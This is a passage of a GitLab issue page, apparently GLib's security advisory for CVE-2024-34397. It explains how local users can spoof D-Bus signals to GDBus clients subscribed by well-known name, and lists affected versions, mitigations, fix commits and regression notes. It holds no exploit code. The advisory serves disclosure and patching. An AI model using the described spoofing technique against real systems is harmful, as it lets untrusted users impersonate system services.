<main class="content" id="content-body" itemscope itemtype="http://schema.org/SoftwareSourceCode">
<div class="flash-container flash-container-page sticky" data-testid="flash-container">
<div id="js-global-alerts"></div>
</div>







<div class="issue-details issuable-details js-issue-details">
<div class="detail-page-description content-block js-detail-page-description gl-pt-3 gl-pb-0 gl-border-none">
<div data-header-actions-data="{&quot;can_create_issue&quot;:&quot;true&quot;,&quot;can_create_incident&quot;:&quot;false&quot;,&quot;can_destroy_issue&quot;:&quot;false&quot;,&quot;can_reopen_issue&quot;:&quot;false&quot;,&quot;can_report_spam&quot;:&quot;&quot;,&quot;can_update_issue&quot;:&quot;false&quot;,&quot;is_issue_author&quot;:&quot;false&quot;,&quot;issue_path&quot;:&quot;/GNOME/glib/-/issues/3268&quot;,&quot;new_issue_path&quot;:&quot;/GNOME/glib/-/issues/new?add_related_issue=3268&quot;,&quot;project_path&quot;:&quot;GNOME/glib&quot;,&quot;report_abuse_path&quot;:&quot;/-/abuse_reports/add_category&quot;,&quot;reported_user_id&quot;:8744,&quot;reported_from_url&quot;:&quot;https://gitlab.gnome.org/GNOME/glib/-/issues/3268&quot;,&quot;submit_as_spam_path&quot;:&quot;/GNOME/glib/-/issues/3268/mark_as_spam&quot;,&quot;issuable_email_address&quot;:null}" data-initial="{&quot;endpoint&quot;:&quot;/GNOME/glib/-/issues/3268&quot;,&quot;updateEndpoint&quot;:&quot;/GNOME/glib/-/issues/3268.json&quot;,&quot;canUpdate&quot;:false,&quot;canDestroy&quot;:false,&quot;issuableRef&quot;:&quot;#3268&quot;,&quot;imported&quot;:false,&quot;markdownPreviewPath&quot;:&quot;/GNOME/glib/-/preview_markdown?target_id=3268\u0026target_type=Issue&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;lockVersion&quot;:10,&quot;issuableTemplateNamesPath&quot;:&quot;/GNOME/glib/description_templates/names/issue&quot;,&quot;initialTitleHtml&quot;:&quot;CVE-2024-34397: GDBus signal subscriptions for well-known names are vulnerable to unicast spoofing&quot;,&quot;initialTitleText&quot;:&quot;CVE-2024-34397: GDBus signal subscriptions for well-known names are vulnerable to unicast spoofing&quot;,&quot;initialDescriptionHtml&quot;:&quot;\u003ch2 data-sourcepos=\&quot;1:1-1:24\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-vulnerability-summary\&quot; class=\&quot;anchor\&quot; href=\&quot;#vulnerability-summary\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eVulnerability summary\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;3:1-3:285\&quot; dir=\&quot;auto\&quot;\u003eAlicia Boya García discovered a security issue in GLib&#39;s \u003ccode data-sourcepos=\&quot;3:60-3:74\&quot;\u003eGDBusConnection\u003c/code\u003e. When subscribing to a D-Bus signal using a well-known name such as \u003ccode data-sourcepos=\&quot;3:146-3:160\&quot;\u003ecom.example.Foo\u003c/code\u003e, the signal subscription mechanism did not check that the sender of the signal was genuinely the owner of the desired name.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;5:1-5:57\&quot; dir=\&quot;auto\&quot;\u003eCVE-2024-34397 has been allocated for this vulnerability.\u003c/p\u003e\u0026#x000A;\u003ch3 data-sourcepos=\&quot;7:1-7:10\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h3\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;9:1-9:408\&quot; dir=\&quot;auto\&quot;\u003eWhen a GDBus-based client subscribes to signals from a trusted system service such as NetworkManager or systemd-logind on a shared computer, other users of the same computer can send spoofed D-Bus signals that the GDBus-based client will wrongly interpret as having been sent by the trusted system service. This could lead to the GDBus-based client behaving incorrectly, with an application-dependent impact.\u003c/p\u003e\u0026#x000A;\u003ch3 data-sourcepos=\&quot;11:1-11:18\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-fixed-versions\&quot; class=\&quot;anchor\&quot; href=\&quot;#fixed-versions\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eFixed versions\u003c/h3\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;13:1-13:147\&quot; dir=\&quot;auto\&quot;\u003ePlease note that initial fixes for this vulnerability caused a regression for users of ibus (\u003ca href=\&quot;/GNOME/glib/-/issues/3353\&quot; data-reference-type=\&quot;issue\&quot; data-original=\&quot;#3353\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-issue=\&quot;199972\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;3353\&quot; data-issue-type=\&quot;issue\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Fixing CVE-2024-34397 caused regressions for ibus\&quot; class=\&quot;gfm gfm-issue\&quot;\u003e#3353 (closed)\u003c/a\u003e) which should also be addressed by distributors.\u003c/p\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;15:1-18:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;15:1-15:96\&quot;\u003eGLib 2.80.x ≥ 2.80.1 (stable branch) by \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4039\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4039\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92487\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4039\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4038 “gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match” to glib-2-80\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4039 (merged)\u003c/a\u003e; regression fix for \u003ca href=\&quot;/GNOME/glib/-/issues/3353\&quot; data-reference-type=\&quot;issue\&quot; data-original=\&quot;#3353\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-issue=\&quot;199972\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;3353\&quot; data-issue-type=\&quot;issue\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Fixing CVE-2024-34397 caused regressions for ibus\&quot; class=\&quot;gfm gfm-issue\&quot;\u003e#3353 (closed)\u003c/a\u003e in 2.80.2 via \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4055\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4055\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92548\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4055\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4053 “gdbusconnection: Allow name owners to have the syntax of a well-known name” to glib-2-80\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4055 (merged)\u003c/a\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;16:1-16:100\&quot;\u003eGLib 2.78.x ≥ 2.78.5 (old stable branch) by \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4040\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4040\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92488\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4040\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4038 “gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match” to glib-2-78\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4040 (merged)\u003c/a\u003e; regression fix for \u003ca href=\&quot;/GNOME/glib/-/issues/3353\&quot; data-reference-type=\&quot;issue\&quot; data-original=\&quot;#3353\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-issue=\&quot;199972\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;3353\&quot; data-issue-type=\&quot;issue\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Fixing CVE-2024-34397 caused regressions for ibus\&quot; class=\&quot;gfm gfm-issue\&quot;\u003e#3353 (closed)\u003c/a\u003e in 2.78.6 via \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4056\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4056\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92549\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4056\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4053 “gdbusconnection: Allow name owners to have the syntax of a well-known name” to glib-2-78\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4056 (merged)\u003c/a\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;17:1-18:0\&quot;\u003eGLib ≥ 2.81.0 (development branch) by \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4038\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4038\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92486\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4038\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4038 (merged)\u003c/a\u003e; regression fix for \u003ca href=\&quot;/GNOME/glib/-/issues/3353\&quot; data-reference-type=\&quot;issue\&quot; data-original=\&quot;#3353\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-issue=\&quot;199972\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;3353\&quot; data-issue-type=\&quot;issue\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Fixing CVE-2024-34397 caused regressions for ibus\&quot; class=\&quot;gfm gfm-issue\&quot;\u003e#3353 (closed)\u003c/a\u003e via \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4053\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4053\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92537\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4053\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Allow name owners to have the syntax of a well-known name\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4053 (merged)\u003c/a\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;19:1-19:144\&quot; dir=\&quot;auto\&quot;\u003eOlder branches such as 2.76.x are EOL and will not receive new upstream releases, but downstream distributions are likely to backport the fixes.\u003c/p\u003e\u0026#x000A;\u003ch3 data-sourcepos=\&quot;21:1-21:23\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-vulnerable-versions\&quot; class=\&quot;anchor\&quot; href=\&quot;#vulnerable-versions\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eVulnerable versions\u003c/h3\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;23:1-25:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;23:1-23:27\&quot;\u003eGLib 2.80.x before 2.80.1\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;24:1-25:0\&quot;\u003eall versions before 2.78.5\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch3 data-sourcepos=\&quot;26:1-26:27\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-workaroundsmitigations\&quot; class=\&quot;anchor\&quot; href=\&quot;#workaroundsmitigations\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eWorkarounds/mitigations\u003c/h3\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;28:1-28:92\&quot; dir=\&quot;auto\&quot;\u003eSubscribing to a signal by its sender&#39;s D-Bus unique name (such as \u003ccode data-sourcepos=\&quot;28:69-28:73\&quot;\u003e:1.42\u003c/code\u003e) is not affected.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;30:1-30:295\&quot; dir=\&quot;auto\&quot;\u003eSubscribing to a signal from the D-Bus message bus by its name \u003ccode data-sourcepos=\&quot;30:65-30:84\&quot;\u003eorg.freedesktop.DBus\u003c/code\u003e is not affected. This is a special name defined by the D-Bus protocol, which has the syntax of a well-known name, but behaves like a unique name (and in particular can appear in the sender field of a message).\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;32:1-32:363\&quot; dir=\&quot;auto\&quot;\u003ePrograms that use \u003ccode data-sourcepos=\&quot;32:20-32:55\&quot;\u003eg_dbus_connection_signal_subscribe()\u003c/code\u003e for a well-known name such as \u003ccode data-sourcepos=\&quot;32:89-32:103\&quot;\u003ecom.example.Foo\u003c/code\u003e could mitigate this vulnerability by tracking the current owner of the well-known name themselves, for example by using \u003ccode data-sourcepos=\&quot;32:227-32:244\&quot;\u003eg_bus_watch_name()\u003c/code\u003e, and ignoring any calls to the \u003ccode data-sourcepos=\&quot;32:279-32:297\&quot;\u003eGDBusSignalCallback\u003c/code\u003e where the \u003ccode data-sourcepos=\&quot;32:311-32:321\&quot;\u003esender_name\u003c/code\u003e does not match the name&#39;s current owner.\u003c/p\u003e\u0026#x000A;\u003ch3 data-sourcepos=\&quot;34:1-34:9\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-fixes\&quot; class=\&quot;anchor\&quot; href=\&quot;#fixes\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eFixes\u003c/h3\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;36:1-36:60\&quot; dir=\&quot;auto\&quot;\u003eFixing this vulnerability requires multiple changes to GLib:\u003c/p\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;38:1-47:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;38:1-38:76\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/1e648b677f16d25e9f04c1c154904ad3290870f9\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;1e648b67\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;1e648b677f16d25e9f04c1c154904ad3290870f9\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusprivate: Add symbolic constants for the message bus itself\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e1e648b67\u003c/a\u003e \&quot;gdbusprivate: Add symbolic constants for the message bus itself\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;39:1-39:73\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/8dfea5609e077089311d726e0eb2e186bc0214af\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;8dfea560\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;8dfea5609e077089311d726e0eb2e186bc0214af\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Move SignalData, SignalSubscriber higher up\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e8dfea560\u003c/a\u003e \&quot;gdbusconnection: Move SignalData, SignalSubscriber higher up\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;40:1-40:63\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/816da60571ddf8cdc99c6feae60f1a0accd41593\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;816da605\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;816da60571ddf8cdc99c6feae60f1a0accd41593\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Factor out signal_data_new_take()\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e816da605\u003c/a\u003e \&quot;gdbusconnection: Factor out signal_data_new_take()\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;41:1-41:58\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/5d7ad6897cf4b6ec7321c78c06c610d2c01a1a5f\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;5d7ad689\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;5d7ad6897cf4b6ec7321c78c06c610d2c01a1a5f\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Factor out add_signal_data()\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e5d7ad689\u003c/a\u003e \&quot;gdbusconnection: Factor out add_signal_data()\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;42:1-42:69\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/7d21b719ed6dbe4bd10e098155c2db81cafd029c\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;7d21b719\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;7d21b719ed6dbe4bd10e098155c2db81cafd029c\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Factor out remove_signal_data_if_unused\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e7d21b719\u003c/a\u003e \&quot;gdbusconnection: Factor out remove_signal_data_if_unused\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;43:1-43:75\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/26a3fb8518c63e0e4248f7115cadb344aea5dcd1\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;26a3fb85\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;26a3fb8518c63e0e4248f7115cadb344aea5dcd1\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Stop storing sender_unique_name in SignalData\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e26a3fb85\u003c/a\u003e \&quot;gdbusconnection: Stop storing sender_unique_name in SignalData\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;44:1-44:62\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/683b14b98167b3fd7f91b2c29d2b0d661b5df534\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;683b14b9\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;683b14b98167b3fd7f91b2c29d2b0d661b5df534\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbus: Track name owners for signal subscriptions\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e683b14b9\u003c/a\u003e \&quot;gdbus: Track name owners for signal subscriptions\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;45:1-45:79\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/d4b65376512b40ed602119f7492e5eb27a423cbc\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;d4b65376\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;d4b65376512b40ed602119f7492e5eb27a423cbc\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003ed4b65376\u003c/a\u003e \&quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;46:1-47:0\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/7d65f6c5a20f67aa9a857d0f7b0bf5de4d75be9b\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;7d65f6c5\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;7d65f6c5a20f67aa9a857d0f7b0bf5de4d75be9b\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Allow name owners to have the syntax of a well-known name\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e7d65f6c5\u003c/a\u003e \&quot;gdbusconnection: Allow name owners to have the syntax of a well-known name\&quot; (regression fix, see \u003ca href=\&quot;/GNOME/glib/-/issues/3353\&quot; data-reference-type=\&quot;issue\&quot; data-original=\&quot;#3353\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-issue=\&quot;199972\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;3353\&quot; data-issue-type=\&quot;issue\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Fixing CVE-2024-34397 caused regressions for ibus\&quot; class=\&quot;gfm gfm-issue\&quot;\u003e#3353 (closed)\u003c/a\u003e; added in 2.80.2)\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;48:1-48:327\&quot; dir=\&quot;auto\&quot;\u003eThe bug fix commits \u003ca href=\&quot;/GNOME/glib/-/commit/10e9a917be7fb92b6b27837ef7a7f1d0be6095d5\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;10e9a917\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;10e9a917be7fb92b6b27837ef7a7f1d0be6095d5\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusmessage: Cache the arg0 value\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e10e9a917\u003c/a\u003e \&quot;gdbusmessage: Cache the arg0 value\&quot; and \u003ca href=\&quot;/GNOME/glib/-/commit/7b15b1db4088aac26095d6e211c5b10375160d21\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;7b15b1db\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;7b15b1db4088aac26095d6e211c5b10375160d21\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbus-proxy test: Wait before asserting name owner has gone away\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e7b15b1db\u003c/a\u003e \&quot;gdbus-proxy test: Wait before asserting name owner has gone away\&quot; are not required to fix the vulnerability, but applying them in addition is recommended. When applying the vulnerability fix without those commits, GLib test failures were observed.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;50:1-50:187\&quot; dir=\&quot;auto\&quot;\u003eWhen backporting to older stable release branches, a backport of \u003ccode data-sourcepos=\&quot;50:67-50:77\&quot;\u003eg_set_str()\u003c/code\u003e will be required, for example \u003ca href=\&quot;/GNOME/glib/-/commit/67052fedf451975c86396b75fda81cef6cd47beb\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;67052fed\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;67052fedf451975c86396b75fda81cef6cd47beb\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;gdbusconnection: Make a backport of g_set_str() available\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e67052fed\u003c/a\u003e \&quot;gdbusconnection: Make a backport of g_set_str() available\&quot; in \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4041\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4041\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92490\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4041\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4038 \u0026quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\u0026quot; to glib-2-74\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4041 (closed)\u003c/a\u003e.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;52:1-52:443\&quot; dir=\&quot;auto\&quot;\u003eFixing this vulnerability will trigger a regression in GNOME Shell&#39;s implementation of screen recording and screencasting, due to a pre-existing GNOME Shell bug. Applying commit \u003ca href=\&quot;/GNOME/gnome-shell/-/commit/50a011a19dcc6997ea6173c07bb80b2d9888d363\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;GNOME/gnome-shell@50a011a1\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;546\&quot; data-commit=\&quot;50a011a19dcc6997ea6173c07bb80b2d9888d363\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;screencast: Correct expected bus name for streams\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003egnome-shell@50a011a1\u003c/a\u003e \&quot;screencast: Correct expected bus name for streams\&quot; to GNOME Shell fixes that regression. In distributions that ship GNOME Shell, it is recommended to make that change as part of the same security update that fixes the GLib vulnerability.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;54:1-54:166\&quot; dir=\&quot;auto\&quot;\u003e\u003ca href=\&quot;/GNOME/glib/-/merge_requests/4041\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4041\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92490\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4041\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4038 \u0026quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\u0026quot; to glib-2-74\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4041 (closed)\u003c/a\u003e and \u003ca href=\&quot;/GNOME/glib/-/merge_requests/4042\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;!4042\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-merge-request=\&quot;92491\&quot; data-project-path=\&quot;GNOME/glib\&quot; data-iid=\&quot;4042\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Backport !4038 \u0026quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\u0026quot; to glib-2-66\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003e!4042 (closed)\u003c/a\u003e contain unofficial backports to GLib 2.74.x (for Debian 12) and 2.66.x (for Debian 11) which other distributors might find useful as a starting point.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;56:1-56:18\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-test-coverage\&quot; class=\&quot;anchor\&quot; href=\&quot;#test-coverage\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eTest coverage\u003c/h4\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;58:1-65:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;58:1-58:67\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;/GNOME/glib/-/commit/124b4571bb5ef5b268eeea987d00b756a4480fc0\&quot; data-reference-type=\&quot;commit\&quot; data-original=\&quot;124b4571\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;false\&quot; data-project=\&quot;658\&quot; data-commit=\&quot;124b4571bb5ef5b268eeea987d00b756a4480fc0\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;tests: Add a data-driven test for signal subscriptions\&quot; class=\&quot;gfm gfm-commit has-tooltip\&quot;\u003e124b4571\u003c/a\u003e \&quot;tests: Add a data-driven test for signal subscriptions\&quot;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;59:1-59:81\&quot;\u003e\u0026#x000A;\u003ca 